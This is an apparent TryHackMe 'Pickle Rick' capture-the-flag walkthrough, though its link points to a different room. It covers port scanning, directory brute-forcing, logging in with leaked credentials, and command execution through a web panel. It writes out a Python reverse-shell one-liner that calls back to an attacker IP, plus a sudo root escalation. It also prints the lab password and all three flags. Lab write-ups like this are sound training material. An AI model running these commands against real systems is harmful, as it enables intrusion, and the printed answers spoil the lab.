All steps and concepts about CTF Pickle Rick https://tryhackme.com/room/mrrobot

1 - Conect to VPN 

2 - Make PortScaning with 'nmap'

    nmap 10.10.92.224 (basic)

    returns:
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

    nmap -sV -p 22,80 10.10.92.224 (-sV softwares' version,-p especify ports to quick result)

    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
3 - So, there is a webpage on http://10.10.92.224/ with Theme of CTF Pickle Rick

4 - Orientation: see the source code of webpage

    On source coud, there is a comment saying about a username 'R1ckRul3s'

5 - List all folders and paths that can exists on IP with Gobuster

    It can be done with many 'tools' like dirb (used easyctf), in this case, we'll use 'gobuster'

    First , go into wordlist directory 
    
    cd "/usr/share/wordlists/dirbuster"

    gobuster dir -u http://10.10.92.224/ -w directory-list-2.3-medium.txt -x php, html, txt

    (dir for directories, -u where is the target IP, -w the file of wordlist, -x extentions of files *optional)

    returns:

    /login.php            (Status: 200) [Size: 882]
    /assets               (Status: 301) [Size: 313] [--> http://10.10.92.224/assets/]
    /portal.php           (Status: 302) [Size: 0] [--> /login.php]

6 - On /robots.txt is the password for username founded on comment of source code of webpage

7 - Log in /login.php   

    username 'R1ckRul3s'
    password 'Wubbalubbadubdub'

8 - You'll be redirect to /portal.php. It has a command panel to execute any command linux like 'ls'/'cd' ....

9 - This 'command panel' is called as RCE - Remote Code execution

    It can have some failures to execute any system code using this 'command panel'

    And it need be explored

10 - If you list the current directory the command panel is , returns:

    Sup3rS3cretPickl3Ingred.txt
    assets
    clue.txt
    denied.php
    index.html
    login.php
    portal.php
    robots.txt

11 - If you try get content Sup3rS3cretPickl3Ingred.txt with cat, you dont have permission, it is disabled

    but the command less works, and returns 

    'mr. meeseek hair'

    This is the firt flag of CTF

12 - Try make Reverse Shell in the target - Tune connection
    
    On revshells.com , we can generate a lot of examples by any language to do it. In this case we'll use python3 because command panel has python3 installed

    Open a port of your machine (machine of tryhackme and not of virtualbox) to be access by, with catnet

    nc -nlv 3333

    The command in python to access

    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.25.96",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'

    Execute this command into command panel of portal.php, it'll make connection between tryhackme machine and command panel

13 - After make connection between tryhackme machine and aplication , Explore the directories

    In /home 

    There is one '/rick' with /ubuntu , go to /rick

14 - In this folder there is a file , that content the second flag

    cat "second ingredients"

    1 jerry tear

15 - The next step is 'Escalate Privileges'

    Find some program  that can be executed like root user:

    sudo -l

    It return that user 'www-data' has acess to execute anything (ALL) NOPASSWD: ALL

    sudo bash -i

    whoami return you're now root

16 - Go to /root and ls

    Returns a 3rd.txt file contents third flag of CTF:

    cat 3rd.txt

    "3rd ingredients: fleeb juice"
